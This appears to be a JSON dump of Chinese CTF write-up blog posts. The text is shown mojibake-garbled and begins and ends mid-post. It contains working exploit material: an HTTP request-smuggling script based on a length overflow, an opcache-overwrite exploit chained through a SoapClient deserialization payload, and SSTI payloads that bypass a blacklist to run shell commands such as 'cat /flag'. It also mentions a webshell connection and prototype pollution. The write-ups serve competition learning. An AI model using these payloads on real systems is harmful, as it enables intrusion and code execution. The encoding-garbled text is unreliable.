0\n}\n\n```\n\nè¾“å‡ºå°±æ˜¯\n![image-20250219140558300](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191405396.png)\n\n##### è¯»å–å‡½æ•°åˆ†æ\n\nåœ¨ `ReadH111Request()` é‡Œï¼Œæ•°æ®æ˜¯æŒ‰ `Len+Data` æ–¹å¼è§£æçš„ï¼š\n\n```go\nvar methodLength uint16\nbinary.Read(reader, binary.BigEndian, &methodLength)\n\nmethod := make([]byte, int(methodLength))\n_, err := io.ReadFull(reader, method)\n```\n\nå¦‚æœ `methodLength == 0x0000`ï¼ˆå› ä¸º `65536` æº¢å‡ºåˆ° `0`ï¼‰ï¼Œåˆ™ï¼š\n\n- **`make([]byte, 0)`** åˆ›å»ºçš„æ˜¯ç©ºæ•°ç»„ã€‚\n- `io.ReadFull(reader, method)` ç›´æ¥è·³è¿‡ `method` çš„è¯»å–ã€‚\n- **æ–¹æ³•å­—æ®µçš„æ•°æ®ä»ç„¶å­˜åœ¨æµä¸­ï¼Œä½†æ²¡æœ‰è¢«è§£æï¼Œå¯¼è‡´åç»­æ•°æ®é”™ä½ï¼Œä»è€Œä¿ç•™æˆ‘ä»¬çš„POSTè¯·æ±‚ï¼**\n\nå½“ `bodyLength == 0`ï¼Œä½†å®é™… `65519` ä¸ªå­—èŠ‚ä»ç„¶åœ¨ TCP æµé‡Œã€‚\n\n#### åˆ†æmain.go\n\nå¤„ç†å®¢æˆ·ç«¯è¿æ¥ä½¿ç”¨äº†æ— é™forå¾ªç¯\n\n```go\nfor {\n\tconn, err := listener.Accept()\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tcontinue\n\t}\n\tgo serverH111(conn)\n}\n\nfunc serverH111(conn net.Conn) {\n\tdefer conn.Close()\n\tfor {\n\t\treq, err := h111.ReadH111Request(conn)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\t\trecorder := httptest.NewRecorder()\n\t\tmux.ServeHTTP(recorder, req)\n\t\tresp := recorder.Result()\n\t\tlog.Printf(\"Received request %s %s, response status code %d\", req.Method, req.URL.Path, resp.StatusCode)\n\t\terr = h111.WriteH111Response(conn, resp)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\t}\n}\n\n```\n\n`for {}` æ— é™å¾ªç¯ï¼Œä¸æ–­æ¥å—æ–°çš„è¿æ¥ã€‚\n\n#### åˆ†æåå‘ä»£ç†main.go\n\n```go\nfunc main() {\n\tpool = sync.Pool{\n\t\tNew: func() interface{} {\n\t\t\tfor {\n\t\t\t\tconn, err := net.Dial(\"tcp\", \"127.0.0.1:8080\")\n\t\t\t\tif err != nil {\n\t\t\t\t\tfmt.Println(\"error dialing to backend server\")\n\t\t\t\t\ttime.Sleep(time.Millisecond * 300)\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\treturn conn\n\t\t\t}\n\t\t},\n\t}\n\thttp.ListenAndServe(\":8081\", &proxyHandler{})\n}\n\n```\n\n**`sync.Pool{ New: func() { ... } }`**\n\n- å®šä¹‰äº†è¿æ¥æ± çš„ `New` å‡½æ•°ï¼š**å½“è¿æ¥æ± ä¸ºç©ºæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ TCP è¿æ¥**ã€‚\n\n**ä½¿ç”¨ `sync.Pool` ä½œä¸ºè¿æ¥æ± ï¼Œä¼˜åŒ– TCP è¿æ¥å¤ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹**\n\n#### å®æ–½æ”»å‡»\n\næ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯é€šè¿‡æ„é€ ä¸€ä¸ªé•¿åº¦ç­‰äº65536çš„GETè¯·æ±‚ï¼Œé€šè¿‡æº¢å‡ºå½’0ï¼Œèµ°ç§æˆ‘ä»¬çš„POSTè¯·æ±‚\n\nå®˜æ–¹WPæ˜¯ç”¨çš„yakitå‘åŒ…ï¼Œæˆ‘ç”¨åˆ°yakitæ¯”è¾ƒå°‘ï¼Œå†™äº†ä¸ªè„šæœ¬\n\n![image-20250219151908490](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191519027.png)\n\n\n\nè„šæœ¬ï¼š\n\n```python\nimport socket\nimport struct\n\ndef build_h111_request():\n    method = b'POST'\n    uri = b'/flag'\n    headers = {}  # æ— è¯·æ±‚å¤´\n    body = b''    # ç©ºè¯·æ±‚ä½“\n\n    data = b''\n    # æ–¹æ³•éƒ¨åˆ†\n    data += struct.pack('>H', len(method))  # æ–¹æ³•é•¿åº¦ï¼ˆå¤§ç«¯åº2å­—èŠ‚ï¼‰\n    data += method                          # æ–¹æ³•å†…å®¹\n    # URIéƒ¨åˆ†\n    data += struct.pack('>H', len(uri))     # URIé•¿åº¦\n    data += uri                             # URIå†…å®¹\n    # è¯·æ±‚å¤´éƒ¨åˆ†\n    data += struct.pack('>H', len(headers)) # è¯·æ±‚å¤´æ•°é‡\n    for key, values in headers.items():     # éå†æ¯ä¸ªè¯·æ±‚å¤´ï¼ˆæ­¤å¤„æ— ï¼‰\n        key_bytes = key.encode()\n        data += struct.pack('>H', len(key_bytes))\n        data += key_bytes\n        for value in values:\n            value_bytes = value.encode()\n            data += struct.pack('>H', len(value_bytes))\n            data += value_bytes\n    # è¯·æ±‚ä½“éƒ¨åˆ†\n    data += struct.pack('>H', len(body))    # è¯·æ±‚ä½“é•¿åº¦\n    data += body                            # è¯·æ±‚ä½“å†…å®¹\n\n    return data\n\nh111_request = build_h111_request()  # è¿”å›å­—èŠ‚ä¸²\nprint(h111_request)\n\nlength1 = len(h111_request)\nlength2 = 65536 - length1\nh111_request = h111_request + length2 * b'0'  # ä½¿ç”¨å­—èŠ‚è€Œä¸æ˜¯å­—ç¬¦\nprint(len(h111_request))\n\ndef build_http_request(full_body):\n    \"\"\"\n    æ„é€ æœ€ç»ˆçš„ HTTP è¯·æ±‚\n    \"\"\"\n    request_line = b\"GET /flag HTTP/1.1\\r\\n\"\n    headers = (\n        b\"Host: node1.hgame.vidar.club:31772\\r\\n\" +\n        b\"Content-Length: \" + str(len(full_body)).encode() + b\"\\r\\n\" +\n        b\"\\r\\n\"\n    )\n    if isinstance(full_body, str):\n        full_body = full_body.encode()  # å¦‚æœæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè½¬æ¢ä¸ºå­—èŠ‚ä¸²\n    http_request = request_line + headers + full_body\n    return http_request\n\nhttp_request = build_http_request(h111_request)\nprint(http_request)\n\nhost = \"node1.hgame.vidar.club\"\nport = 31772\n\nwith socket.create_connection((host, port)) as s:\n    s.sendall(http_request)\n    response = b\"\"\n    s.settimeout(5)  # è®¾ç½®æ›´é•¿çš„è¶…æ—¶æ—¶é—´\n    while True:\n        try:\n            data = s.recv(4096)\n            if not data:\n                break\n            response += data\n        except socket.timeout:\n            print(\"Connection timed out!\")\n            break\n    print(response.decode())\n\n```\n\n![image-20250219201613565](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502192016065.png)\n\nè„šæœ¬éœ€è¦å¤šæ‰§è¡Œå‡ æ¬¡ä¿æŒå¤ç”¨","tags":["httpèµ°ç§"]},{"title":"0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_phpå¤ç°","url":"/2025/01/20/0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-single-phpå¤ç°/","content":"\n## [DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_phpå¤ç°\n\n![image-20250110171833140](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png)\n\nè¿›é¢˜å¦‚ä¸Š\n\nä¼ å‚highlight_file,æ‹¿åˆ°æºç \n\n```\n<!DOCTYPE html>\n <html>\n <head>\n <style>\n img {\n max-width: 200px;\n max-height: 200px;\n }\n </style>\n <title>revenge to siranai.php\n \n \n </title>\n \n </head>\n <body>\n \n <h5>\n This is my wife.She is from Imagination.\n And I,use her name as my id.\n </h5>\n <img src=\"mywife.png\" alt=\"this is my wife\">\n <p>I have been single dog for 19 years.<br>\n One day, my brothers betrayed the singles organization.<br>\n S* and B* ,both of them have the kanozyo.<br>\n Now revenge to them!!!!!<br>\n use '$_GET['LuckyE'](__FILE__);' to begin your revenge!!<br>\n </p>\n </body>\n </html>\n <?php\n error_reporting(0);\n class siroha{\n public $koi;\n \n public function __destruct(){\n $this->koi['zhanjiangdiyishenqing']();\n }\n }\n $kanozyo = $_GET['LuckyE'](__FILE__);\n var_dump($kanozyo);\n $suki = unserialize($_POST['suki']); \n```\n\nå¾—åˆ°æç¤ºï¼Œrevenge to siranai.php\n\n![image-20250110172256406](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png)\n\nemmï¼Œçœ‹èµ·æ¥å¾—æ‰“[Soap](https://cloud.tencent.com/developer/article/1878220)ååºåˆ—åŒ–\n\nå›åˆ°åŸå…ˆçš„ååºåˆ—åŒ–çš„é¡µé¢\n\næä¸€ä¸ªphpinfoçœ‹çœ‹\n\n![image-20250110172906287](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png)\n\n![image-20250110173851522](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png)\n\nè¿™ä¸ªç¼“å­˜æ˜¯æ”¾åœ¨äº†/tmpç›®å½•ä¸‹å¹¶æœ‰æ—¶é—´æˆ³éªŒè¯ï¼Œå¯ä»¥å…ˆäº†è§£[opcacheæ‰§è¡Œphpä»£ç ](https://xz.aliyun.com/t/223?time__1311=eqIx0DyGG%3DemqAKqGNSDrDRmhiRRou2bD)\n\né‚£æ•´ä½“çš„æ€è·¯åº”è¯¥å°±æ˜¯ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„å‹ç¼©åŒ…ï¼Œå¯¹åŸæœ¬çš„ç¼“å­˜æ–‡ä»¶è¿›è¡Œè¦†ç›–ï¼Œå˜æˆæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶\n\næœ¬åœ°æ‹‰å–ç›¸åŒç‰ˆæœ¬phpçš„é•œåƒï¼Œç”¨è„šæœ¬è¿›è¡Œä¼ªé€ æ—¶é—´æˆ³\n\næœ¬äººä»£ç èƒ½åŠ›æœ‰é™ï¼Œç›´æ¥ä½¿ç”¨å®˜æ–¹WPçš„ä»£ç \n\n```python\nimport binascii\nimport hashlib\nimport requests\nimport re\nimport tarfile\nimport subprocess\nimport os\nurl = \"http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/?LuckyE=filectime\"\ndef timec():\n    pattern = r\"\\d{10}\"  #åŒ¹é…åä½æ•°å­—\n    timeres = requests.get(url=url)\n    match = re.search(r\"int\\((\\d{10})\\)\",timeres.text)#ä»å“åº”åŒ…ä¸­æå–åˆ°æ—¶é—´æˆ³ä¿¡æ¯\n    try:\n        ten_digit_number = match.group(1)\n        print(ten_digit_number)\n        return ten_digit_number  #è¿”å›æ—¶é—´æˆ³\n    except:\n        print('dame')\n\ndef split_string_into_pairs(input_string):\n    if len(input_string) % 2 != 0:\n        raise ValueError(\"è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»æ˜¯å¶æ•°\")\n    pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)]\n    return pairs\n\ndef totime(time):\n    b = split_string_into_pairs(f\"{hex(int(time))}\")\n    b.pop(0)\n    s = ''\n    for i in range(0, len(b)):\n        s += b[-1]\n        b.pop(-1)\n    return s\ndef changetime():\n    with open(\"index.php.bin\",\"rb\") as file:\n        binary_data = file.read()\n        # å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²\n        hex_data = binascii.hexlify(binary_data).decode('utf-8')\n        new_data = hex_data[0:128]+totime(timec())+hex_data[136:]\n        with open(\"index.php.bin\",\"wb\") as f:\n            f.write(bytes.fromhex(new_data))\nchangetime()\nsys_id = hashlib.md5(\"8.2.10API420220829,NTSBIN_4888(size_t)8\\002\".encode(\"utf-8\")).hexdigest()\nprint(sys_id)\ndef tar_file():\n    tar_filename = 'exp.tar'\n    with tarfile.open(tar_filename,'w') as tar:\n        directory_info = tarfile.TarInfo(name=f'{sys_id}/var/www/html')\n        directory_info.type = tarfile.DIRTYPE\n        directory_info.mode = 0o777\n        tar.addfile(directory_info)\n        tar.add('index.php.bin', arcname=f'{sys_id}/var/www/html/index.php.bin')\ndef upload():\n    file = {\"file\":(\"exp.tar\",open(\"exp.tar\",\"rb\").read(),\"application/x-tar\")}\n    res  = requests.post(url=\"http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/siranai.php\",files=file)\n    print(res.request.headers)\n    return res.request\ntar_file()\nrequest_content = upload()\nupload_body = str(request_content.body).replace(\"\\\"\",\"\\\\\\\"\")\ncontent_length = request_content.headers['Content-Length']\nprint(content_length)\nprint(upload_body)\n```\n\n![image-20250110174712860](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png)\n\nå°è£…åˆ°Soap\n\n```php\n<?php\nclass siroha\n{\n    public $koi;\n\n\n}\n\n$postdata = \"\";\ntry {\n    $a = new SoapClient(null, array('location' => \"http://127.0.0.1/siranai.php\", 'user_agent' => \"Enterpr1se\\r\\n\" . \"Cookie: PHPSESSION=16aaab9fb\\r\\nContent-Type: multipart/form-data; boundary=\" . substr($postdata, 2, 32) . \"\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nContent-Length: 10416\" . \"\\r\\n\\r\\n\" . $postdata,\n        'uri' => \"http://127.0.0.1/siranai.php\"));\n} catch (SoapFault $e) {\n}\n$b = new siroha();\n$b->koi = [\"zhanjiangdiyishenqing\" => [$a, \"nnnnn\"]];\n//é€šè¿‡æ•°ç»„è°ƒç”¨ç±»æ–¹æ³•è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘::__callé­”æœ¯æ–¹æ³•\necho urlencode(serialize($b));\n```\n\nBPæ”¾åŒ…\n\n![image-20250110174642997](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png)\n\nè¿™å°±å·²ç»è¦†ç›–æˆåŠŸäº†ï¼Œç›´æ¥ä¼ å‚æ‹¿åˆ°flag\n\n![image-20250110175053635](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png)\n\n~~è¿™é¢˜ç¡®å®ä¸å¥½å†™ï¼Œæ®è¯´å½“æ—¶æ˜¯é›¶è§£ï¼Œæˆ‘ç°åœ¨å†™éƒ½ä¸å¥½å†™ã€å¤§å“­ã€‘~~"},{"title":"ciscn-ccbéƒ¨åˆ†WP","url":"/2024/12/15/ciscn-ccbéƒ¨åˆ†WP/","content":"\n# Safe_Proxy\n\nå¼€å±€æºç ï¼Œè²Œä¼¼ä¸èƒ½ç›´æ¥æ\n\næ‹‰åˆ°æœ¬åœ°ç›´æ¥æ¢­\n\n```python\nfrom flask import Flask, request, render_template_string\nimport socket\nimport threading\nimport html\n\napp = Flask(__name__)\n\n@app.route('/', methods=[\"GET\"])\ndef source():\n    with open(__file__, 'r', encoding='utf-8') as f:\n        return '<pre>'+html.escape(f.read())+'</pre>'\n\n@app.route('/', methods=[\"POST\"])\ndef template():\n    template_code = request.form.get(\"code\")\n    # å®‰å…¨è¿‡æ»¤\n    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\\r', '\\n']\n    for black in blacklist:\n        if black in template_code:\n            return \"Forbidden content detected!\"\n    result = render_template_string(template_code)\n    print(result)\n    return result\nif __name__ == \"__main__\":\n    app.run(host='127.0.0.1',port=5000)\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151847862.png)\n\næ‹¿payloadç›´æ¥æ‰“\n\n```\ncode={%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i''mport'+'_'*2%}{%set rr='so'[::-1]%}{{cycler.next[gl][bu][im](rr)['p''open']('echo `ls /` > app.py').read()}}\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151848872.png)\n\n```\ncode={%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i''mport'+'_'*2%}{%set rr='so'[::-1]%}{{cycler.next[gl][bu][im](rr)['p''open']('echo `cat /flag` > app.py').read()}}\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151849782.png)\n\n# hello web\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151903324.png)\n\nçœ‹æ³¨é‡Šçœ‹åˆ°äº†ä¸€ä¸ªè¿™ä¸ªæç¤º\n\nè®¿é—®åå‘ç°ï¼Œå¾—....//ç»•è¿‡\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911177.png)\n\nè¿™ä¹ˆä¸ªäº‹å„¿\n\n![image-20241215191139648](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911700.png)\n\nå®ƒæ˜¯ä¸ªğŸå•Š\n\n![image-20241215202829273](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412152028604.png)\n\nèšå‰‘è¿æ¥åœ¨/run/log/è¿™ä¸ªé‡Œé¢çš„å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­æœ‰flag\n\n~~sxweb1æ˜æ˜æŒ‰é“ç†åº”è¯¥å‡ºçš„ï¼Œâ„¢çš„ä¸€ç›´æŠ¥500.......5555555...è¿˜æ˜¯èœã€‚ã€‚ã€‚~~\n\n","tags":["-web -ciscn&ccb"]},{"title":"JSåŸå‹é“¾æ±¡æŸ“","url":"/2024/12/13/JSåŸå‹é“¾æ±¡æŸ“/","content":"\n# JSåŸå‹é“¾æ±¡æŸ“\n\nnodejså’Œjavascriptè¯­æ³•å’Œæ ‡å‡†æœ‰äº›ä¸åŒï¼Œåº”ç”¨åœºæ™¯ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨åŸå‹é“¾æ±¡æŸ“è¿™æ–¹é¢å¯ä»¥äº’é€šã€‚\n\n### JSåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³•\n\n```javascript\njsåˆ›å»ºå¯¹è±¡çš„ä¸‰ç§æ–¹æ³• ï¼š\n\næ™®é€šåˆ›å»º\n\nvar person={name:'lihuaiqiu','age','19'}\n\nvar person={}  //åˆ›å»ºç©ºå¯¹è±¡\n\næ„é€ å‡½æ•°æ–¹æ³•åˆ›å»º\n\nfunction person(){\n    this.name=\"liahuqiu\";\n    this.test=function () {\n        return 1;\n\t}\n}\nperson.prototype.a=3;\nweb=new person();\nconsole.log(web.test());\nconsole.log(web.a)\n\né€šè¿‡objectåˆ›å»º\n\nvar a=new Object();\na.c=3\nconsole.log(a.c)\n```\n\n## åŸå‹é“¾\n\n#### åŸå‹\n\njavascripté‡Œçš„æ¯ä¸€ä¸ªå¯¹è±¡ï¼ˆobjectï¼‰ï¼Œéƒ½æœ‰ä¸€äº›å†…ç½®å±æ€§ï¼ˆpropertyï¼‰ï¼ŒåŸå‹æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥ä»–ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹ï¼Œè¿™å°±å½¢æˆäº†ä¸€ä¸ªåŸå‹é“¾ï¼Œå½“ä¸€ä¸ªåŸå‹çš„åŸå‹æ˜¯nullï¼ŒåŸå‹é“¾å°±ä¼šåœ¨è¿™é‡Œç»“æŸã€‚\n\nè¿™ä¸ªâ€åŸå‹â€œå±æ€§æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡åŸå‹çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå±æ€§æ²¡æœ‰ç»Ÿä¸€çš„ç§°å‘¼ï¼Œä½†æ˜¯æµè§ˆå™¨éƒ½æ”¯æŒä½¿ç”¨ â€\\_\\_proto_\\_â€œæ¥æŸ¥çœ‹åŸå‹ã€‚è®¿é—®ä¸€ä¸ªå¯¹è±¡åŸå‹çš„æ ‡å‡†æ–¹æ³•æ˜¯ä½¿ç”¨ â€Object.getPrototypeOf()â€œã€‚\n\n##### Prototype åŸå‹ | åŸå‹å¯¹è±¡\n\n1ã€Prototypeå®ƒæ˜¯ã€å‡½æ•°çš„ã€‘ä¸€ä¸ªå±æ€§\n\n2ã€Protopypeæ˜¯ä¸ªå¯¹è±¡\n\n3ã€å½“æˆ‘ä»¬åˆ›å»ºå‡½æ•°çš„æ—¶å€™ä¼šé»˜è®¤æ·»åŠ Prototypeè¿™ä¸ªå±æ€§\n\n##### __proto\\_\\_ éšå¼åŸå‹\n\n1ã€ã€å¯¹è±¡ã€‘çš„å±æ€§\n\n2ã€æŒ‡å‘æ„é€ å‡½æ•°çš„Protopype\n\n3ã€obj._\\_proto__ === test.prototype   ç­‰äºtrue\n\n##### åŸå‹é“¾é¡¶å±‚\n\nObject.prototype.__proto\\_\\_     ç­‰äºnull\n\n##### åŸå‹é“¾æŸ¥æ‰¾\n\ninstanceofè¿ç®—ç¬¦å¯ä»¥ç”¨æ¥åˆ¤æ–­æŸä¸ªæ„é€ å‡½æ•°çš„prototypeå±æ€§æ˜¯å¦å­˜åœ¨å¦å¤–ä¸€ä¸ªè¦æ£€æµ‹å¯¹è±¡çš„åŸå‹é“¾\n\n```\nfunction My(){}\nfunction You(){}\n\nvar myOne=new My();\nconsole.info(myOne instanceof My)  //true\nconsole.info(myOne instanceof You)  //false\n```\n\n**JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚**\n\n##### ç¤ºä¾‹\n\n```javascript\nfunction test (name) {\n\tthis.name=name\n    this.a=1\n} //è¿™åªæ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°\n\nconst obj = new test('xiaoming')  //ä½¿ç”¨newç”Ÿæˆobjå¯¹è±¡äº†ï¼Œtestæ­¤æ—¶å°±æ˜¯æ„é€ å‡½æ•°ï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥æ˜¯æ„é€ å‡½æ•°\nconsole.log(obj.a) //è¿”å› 1\ntest.prototype.b=2  //ç»™å‡½æ•°åŸå‹æ·»åŠ bå±æ€§ï¼Œå€¼ä¸º2\nconsole.log(obj.b) //è¿”å›2\nObject.prototype.c=3  //ç»™é¡¶å±‚æ·»åŠ cå±æ€§ï¼Œå€¼ä¸º3\nconsole.log(obj.c) //è¿”å›3\nconsole.log(obj.__proto__ === test.prototype)  //å¯¹è±¡çš„__proto__ç­‰äºå‡½æ•°çš„åŸå‹\nconsole.log(test.prototype.__proto__ === Object.prototypre) //å‡½æ•°åŸå‹å¯¹è±¡çš„__proto__å±æ€§å°±ç­‰äºObjectå‡½æ•°çš„åŸå‹  è¿”å›ture\nconsole.log(Object.prototype.__proto__) //Objectå‡½æ•°çš„åŸå‹å¯¹è±¡çš„__proto__å±æ€§ç­‰äºNULLï¼Œå› ä¸ºObjectæ˜¯é¡¶å±‚\n```\n\n##### ç»“æ„å‰–æ\n\n```javascript\nobj {\n    a:1,                                  //aå±æ€§ï¼Œå€¼ä¸º1\n\t__proto__:test.prototype ={           //obj.__proto__æŒ‡å‘test.prototype\n        b:2,                              //å‡½æ•°åŸå‹æ·»åŠ çš„bå±æ€§ï¼Œå€¼ä¸º2\n\t\t__proto__:Object.prototype = {  //test.prototype.__proto__æŒ‡å‘Object.prototypre\n            c:3,                          //é¡¶å±‚æ·»åŠ çš„cå±æ€§ï¼Œå€¼ä¸º3\n\t\t\t__proto__:null              //Object.prototype.__proto__æŒ‡å‘null   \n\t\t}\n\t}\n}\n```\n\n##### é“¾å­å‰–æ\n\n```\nobj -> __proto__ -> test.prototype -> __proto__ -> Object.prototype -> __proto__ -> null\n```\n\nè¿™å°±æ˜¯objçš„åŸå‹é“¾\n\n#### åŸå‹é“¾æ±¡æŸ“\n\nå› ä¸ºåŸå‹é“¾å°±æ˜¯å¥—å¨ƒçš„ï¼Œä¸€çº§æ¥ç€ä¸€çº§ï¼Œå±æ€§æ˜¯ä»ä¸Šé¢å¾€ä¸‹å åŠ çš„ï¼Œä¸‹é¢çš„éƒ½ä¼šç»§æ‰¿ä¸Šé¢çš„å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬åœ¨åŸå‹é“¾çš„ä¸Šçº§æ·»åŠ äº†æ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆåŸå‹é“¾å°±ä¼šè¢«æ±¡æŸ“ï¼Œåç»­åˆ›å»ºçš„å¯¹è±¡éƒ½å¯ä»¥ç»§æ‰¿å¹¶è°ƒç”¨æ¶æ„å¯¹è±¡ã€‚\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318079.png)\n\nå¦‚æœæœåŠ¡ç«¯ä½¿ç”¨æŸäº›å¯ä»¥å¤åˆ¶ã€ç»§æ‰¿å˜é‡çš„å‡½æ•°ï¼Œå‡½æ•°çš„å‚æ•°æ˜¯ç”¨æˆ·å¯æ§ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½é€ æˆåŸå‹é“¾æ±¡æŸ“æ”»å‡»ã€‚\n\næ­¤æ—¶bçš„ä¸Šçº§åŸå‹açš„å±æ€§å·²ç»è¢«æ±¡æŸ“ï¼Œbç»§æ‰¿aåï¼Œä¹Ÿå¯ä»¥è°ƒç”¨æ¶æ„å¯¹è±¡ã€‚\n\n#### åŸå‹é“¾æ±¡æŸ“åˆ©ç”¨\n\nåœ¨javascriptä¸­ï¼Œfunctionæ˜¯ä¸€ä¸ªç”¨äºå®šä¹‰å‡½æ•°çš„å…³é”®å­—ï¼ŒFunctionæ˜¯ä»£è¡¨æ‰€æœ‰å‡½æ•°çš„å†…ç½®åŸå‹å¯¹è±¡ã€‚\n\n##### constructoræ¦‚å¿µ\n\nObject.prototype.constructorå…¶ä¸­constructoræ˜¯ä¸€ä¸ªå¯¹è±¡çš„æ•°æ®å±æ€§ï¼Œåˆ›å»ºå¯¹è±¡åï¼Œè®¿é—®constructorå±æ€§ï¼Œå¯ä»¥è¿”å›æ„é€ è¯¥å¯¹è±¡çš„æ¥æºã€å°±æ˜¯å‘Šè¯‰ä½ å®ƒæ˜¯ä»å“ªæ¥çš„ã€‘ï¼ˆä¸æ˜¯è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šçº§ï¼Œä¸¤è€…ä¸åŒï¼‰\n\n```\ndemoï¼š\nvar a=1;\na.__proto__\n//NumberÂ {0, toExponential: Æ’, toFixed: Æ’, toPrecision: Æ’, toString: Æ’,Â â€¦}\na.__proto__.constructor\n//Number() { [native code] }\na.constructor\n//Number() { [native code] }\na.constructor === Number\n//true\nvar b=Number(1);\nb.constructor === a.constructor\n//true\n\n```\n\n##### **`constructor` å’Œ `prototype` çš„è§’è‰²**\n\n##### **`constructor` çš„ä½œç”¨**\n\n- æ¯ä¸ª JavaScript 